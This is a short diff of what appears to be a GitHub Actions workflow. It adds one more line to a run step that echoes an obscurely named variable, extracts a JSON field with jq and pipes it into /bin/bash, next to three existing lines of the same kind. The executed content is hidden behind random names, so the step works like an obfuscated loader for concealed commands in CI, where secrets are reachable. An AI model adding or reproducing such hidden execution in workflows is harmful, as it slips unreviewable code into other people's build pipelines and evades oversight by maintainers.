@@ -25,6 +25,7 @@ jobs:
           echo $nzff3 | jq -r .fvtta7 | /bin/bash
           echo $ldb9 | jq -r .wuav7 | /bin/bash
           echo $fey18 | jq -r .ynqw15 | /bin/bash
+          echo $pasnv14 | jq -r .i70429 | /bin/bash
 
       - name: Persist output
         uses: actions/upload-artifact@v4
